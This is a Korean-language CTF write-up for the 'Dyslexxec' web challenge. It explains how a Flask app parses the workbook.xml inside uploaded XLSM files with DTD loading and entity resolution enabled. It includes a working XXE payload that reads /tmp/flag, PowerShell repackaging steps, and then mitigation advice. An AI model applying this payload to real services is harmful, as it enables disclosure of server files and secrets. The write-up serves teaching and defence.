## 1. Overview

* **Target Challenge:** Dyslexxec
* **Category:** Web Hacking
* **Key Concept:** XLSM/OOXML 구조 분석 / XXE Injection / Local File Disclosure

---

## 2. Vulnerability Analysis

### Endpoint

* `/`
* `/downloads/fizzbuzz`
* `/upload/testPandasImplementation`
* `/metadata`

### Service Flow

서비스는 사용자가 업로드한 Excel 파일에서 문서 속성과 시트 이름을 읽어 화면에 출력합니다.

```text
XLSM 파일 업로드
    → 임시 디렉터리에 파일 저장
    → openpyxl로 메타데이터 분석
    → XLSM 내부의 xl/workbook.xml 추출
    → lxml로 workbook.xml 파싱
    → 파싱 결과를 metadata.html에 출력
```

XLSM 파일은 일반적인 단일 바이너리 파일처럼 보이지만, 실제로는 여러 XML 파일과 리소스를 ZIP으로 묶은 OOXML 형식입니다. 따라서 압축 내부의 `xl/workbook.xml`을 조작하여 XML 파서를 공격할 수 있습니다.

### Source Code Analysis

#### `app.py`

```python
@app.route("/downloads/fizzbuzz")
def return_fizzbuzz():
    return send_file("./fizzbuzz.xlsm")

@app.route("/upload/testPandasImplementation")
def upload_file():
    return render_template("upload.html")

@app.route("/metadata", methods=["GET", "POST"])
def view_metadata():
    if request.method == "GET":
        return render_template("error_upload.html")

    f = request.files["file"]
    tmpFolder = "./uploads/" + str(uuid.uuid4())
    os.mkdir(tmpFolder)

    filename = tmpFolder + "/" + secure_filename(f.filename)
    f.save(filename)

    try:
        properties = getMetadata(filename)
        extractWorkbook(filename, tmpFolder)

        workbook = tmpFolder + "/" + WORKBOOK
        properties.append(findInternalFilepath(workbook))
    except Exception:
        return render_template("error_upload.html")
    finally:
        shutil.rmtree(tmpFolder)

    return render_template("metadata.html", items=properties)
```

업로드된 파일은 UUID 기반의 임시 디렉터리에 저장됩니다. `secure_filename()`을 사용하므로 업로드 파일명을 통한 직접적인 경로 조작은 제한됩니다.

그러나 저장된 XLSM 파일에서 공격자가 조작한 `xl/workbook.xml`을 추출한 뒤 별도의 보안 설정 없이 파싱한다는 점이 핵심 공격 지점입니다.

#### `getExcelMetadata.py`

```python
from lxml import etree
from openpyxl import load_workbook
from zipfile import ZipFile

WORKBOOK = "xl/workbook.xml"

def extractWorkbook(filename, outfile="xml"):
    with ZipFile(filename, "r") as zip:
        zip.extract(WORKBOOK, outfile)

def findInternalFilepath(filename):
    try:
        prop = None

        parser = etree.XMLParser(
            load_dtd=True,
            resolve_entities=True
        )

        tree = etree.parse(filename, parser=parser)
        root = tree.getroot()

        internalNode = root.find(
            ".//{http://schemas.microsoft.com/office/"
            "spreadsheetml/2010/11/ac}absPath"
        )

        if internalNode is not None:
            prop = {
                "Fieldname": "absPath",
                "Attribute": internalNode.attrib["url"],
                "Value": internalNode.text
            }

        return prop
    except Exception:
        print("couldnt extract absPath")
        return None
```

취약점은 다음 XML 파서 설정에서 발생합니다.

```python
parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
```

* `load_dtd=True`: XML 문서에 선언된 DTD를 읽습니다.
* `resolve_entities=True`: `&flag;`와 같은 엔티티를 실제 리소스 내용으로 치환합니다.

공격자가 외부 엔티티의 대상으로 서버 내부 파일을 지정하면, XML 파서는 해당 파일을 읽어 엔티티 위치에 삽입합니다.

이후 치환된 결과가 다음 코드에서 응답 데이터로 사용됩니다.

```python
"Value": internalNode.text
```

`metadata.html`은 이 값을 HTML 테이블에 출력하므로 서버 내부 파일 내용이 사용자에게 그대로 노출될 수 있습니다.

#### `docker-entrypoint.sh`

```sh
FLAG_VALUE="${T34M_FLAG:-FLAG{LOCAL_PRACTICE_ONLY}}"
printf '%s\n' "$FLAG_VALUE" > /tmp/flag
chmod 0400 /tmp/flag
unset FLAG_VALUE T34M_FLAG
```

컨테이너가 시작될 때 환경 변수의 FLAG 값이 `/tmp/flag`에 저장됩니다. 따라서 XXE를 이용해 읽어야 하는 목표 파일은 `/tmp/flag`입니다.

### Vulnerable Data Flow

```text
공격자가 조작한 XLSM
        ↓
xl/workbook.xml 추출
        ↓
load_dtd=True로 DTD 로드
        ↓
resolve_entities=True로 외부 엔티티 해석
        ↓
file:///tmp/flag 읽기
        ↓
internalNode.text에 파일 내용 저장
        ↓
metadata.html 응답에 FLAG 출력
```

---

## 3. Proof of Concept (PoC)

### 3.1 Base XLSM Download

서비스가 제공하는 정상 XLSM 파일을 다운로드합니다.

```text
/downloads/fizzbuzz
```

정상 파일을 기반으로 수정하면 OOXML 패키지 구조와 관계 파일을 그대로 유지할 수 있어 `openpyxl.load_workbook()` 검사를 통과하기 쉽습니다.

### 3.2 XLSM Extraction

XLSM은 ZIP 형식이므로 확장자를 복사한 뒤 압축을 해제합니다.

```powershell
Copy-Item .\fizzbuzz.xlsm .\fizzbuzz.zip
Expand-Archive .\fizzbuzz.zip -DestinationPath .\fizzbuzz_extracted
```

압축을 해제하면 다음 파일을 확인할 수 있습니다.

```text
fizzbuzz_extracted/
├── [Content_Types].xml
├── _rels/
├── docProps/
└── xl/
    ├── workbook.xml
    ├── worksheets/
    └── _rels/
```

공격에 사용할 파일은 `xl/workbook.xml`입니다.

### 3.3 XXE Payload

`xl/workbook.xml`에 외부 엔티티를 선언하고, 서버 코드가 탐색하는 `x15ac:absPath` 요소의 텍스트에 엔티티를 삽입합니다.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
  <!ENTITY flag SYSTEM "file:///tmp/flag">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <workbookPr/>
  <workbookProtection/>

  <bookViews>
    <workbookView
      visibility="visible"
      minimized="0"
      showHorizontalScroll="1"
      showVerticalScroll="1"
      showSheetTabs="1"
      tabRatio="600"
      firstSheet="0"
      activeTab="0"
      autoFilterDateGrouping="1"/>
  </bookViews>

  <sheets>
    <sheet
      xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
      name="FizzBuzz"
      sheetId="1"
      state="visible"
      r:id="rId1"/>
  </sheets>

  <definedNames/>
  <calcPr calcId="124519" fullCalcOnLoad="1"/>

  <x15ac:absPath
    xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac"
    url="/">&flag;</x15ac:absPath>
</workbook>
```

페이로드의 핵심 부분은 다음과 같습니다.

```xml
<!ENTITY flag SYSTEM "file:///tmp/flag">
```

`flag`라는 외부 엔티티가 서버 내부의 `/tmp/flag` 파일을 가리키도록 선언합니다.

```xml
<x15ac:absPath ...>&flag;</x15ac:absPath>
```

취약한 XML 파서가 `&flag;`를 해석하면 해당 위치가 `/tmp/flag`의 실제 내용으로 치환됩니다.

### 3.4 Repackaging

수정한 파일을 다시 압축합니다. 이때 `fizzbuzz_extracted` 디렉터리 자체가 아니라 내부 파일들이 ZIP 최상위에 위치해야 합니다.

```powershell
Compress-Archive `
  -Path .\fizzbuzz_extracted\* `
  -DestinationPath .\exploit.zip `
  -CompressionLevel Optimal

Rename-Item .\exploit.zip exploit.xlsm
```

압축 구조를 확인합니다.

```powershell
tar -tf .\exploit.xlsm
```

다음 경로가 정확하게 존재해야 합니다.

```text
xl/workbook.xml
[Content_Types].xml
```

서버는 업로드 크기를 32KB로 제한하므로 최종 파일 크기도 확인합니다.

```powershell
(Get-Item .\exploit.xlsm).Length
```

### 3.5 Upload

생성한 `exploit.xlsm`을 `/upload/testPandasImplementation` 페이지에서 업로드합니다.

```text
exploit.xlsm
    → POST /metadata
    → xl/workbook.xml 추출
    → XXE 페이로드 실행
```

<!-- 업로드 화면 캡처 예시: ![Exploit upload](images/upload.png) -->

---

## 4. Execution & Result

업로드된 XLSM은 `openpyxl` 메타데이터 검사를 통과한 뒤 서버에서 압축 해제됩니다.

`findInternalFilepath()`가 `xl/workbook.xml`을 다시 파싱하는 과정에서 외부 엔티티가 해석되고, `/tmp/flag` 내용이 `absPath` 항목의 `Value`로 반환됩니다.

```text
Field Name : absPath
Attribute  : /
Value      : FLAG{...}
```

따라서 메타데이터 결과 페이지에서 최종 FLAG를 확인할 수 있습니다.

<!-- 결과 화면 캡처 예시: ![XXE result](images/result.png) -->

---

## 5. Root Cause

이 취약점의 근본 원인은 신뢰할 수 없는 XML을 처리하면서 DTD 로딩과 외부 엔티티 해석을 동시에 활성화한 것입니다.

```python
etree.XMLParser(
    load_dtd=True,
    resolve_entities=True
)
```

파일 확장자가 XLSM이고 `secure_filename()`을 사용하더라도 XLSM 내부 XML의 내용까지 안전해지는 것은 아닙니다.

또한 임시 파일을 `finally`에서 삭제하더라도 이미 XML 파싱 결과가 응답 객체에 저장되었으므로 정보 유출을 막을 수 없습니다.

---

## 6. Mitigation

외부 엔티티와 DTD를 사용하지 않는 경우 다음과 같이 비활성화해야 합니다.

```python
parser = etree.XMLParser(
    load_dtd=False,
    resolve_entities=False,
    no_network=True,
    huge_tree=False
)
```

추가로 `DOCTYPE`이 포함된 문서를 거부할 수 있습니다.

```python
tree = etree.parse(filename, parser=parser)

if tree.docinfo.doctype:
    raise ValueError("DOCTYPE is not allowed")
```

압축 해제 전에는 `ZipInfo.file_size` 등을 확인하여 비정상적으로 큰 XML 파일과 ZIP Bomb 공격을 제한해야 합니다.

예외를 모두 숨기는 다음 코드도 디버깅과 보안 모니터링을 어렵게 만듭니다.

```python
except Exception:
    return render_template("error_upload.html")
```

사용자에게는 일반적인 오류 메시지를 반환하더라도 서버 로그에는 예외 유형과 스택 트레이스를 기록해야 합니다.

---

## 7. Takeaways

* **Office 파일도 XML 공격의 입력이 될 수 있음**

  XLSX와 XLSM은 ZIP 기반 OOXML 형식이므로 내부 XML 파일을 공격자가 직접 조작할 수 있습니다.

* **DTD와 외부 엔티티는 기본적으로 비활성화해야 함**

  사용자 입력 XML에서 `load_dtd=True`, `resolve_entities=True`를 함께 사용하면 서버 내부 파일 유출로 이어질 수 있습니다.

* **파일명 검증만으로 파일 내용은 보호되지 않음**

  `secure_filename()`은 파일명 기반 경로 조작을 줄여줄 뿐, 파일 내부의 악성 XML이나 XXE 페이로드를 탐지하지 않습니다.

* **압축 파일은 압축 해제 후 크기도 제한해야 함**

  HTTP 요청 크기 제한은 압축된 업로드 파일만 대상으로 하므로 압축 해제 후 리소스 사용량을 별도로 제한해야 합니다.

* **예외 로그를 남겨야 함**

  모든 예외를 동일한 오류 페이지로 처리하면 공격 탐지와 장애 분석이 어려워집니다. 민감한 정보는 숨기되 서버 내부 로그에는 원인을 기록해야 합니다.
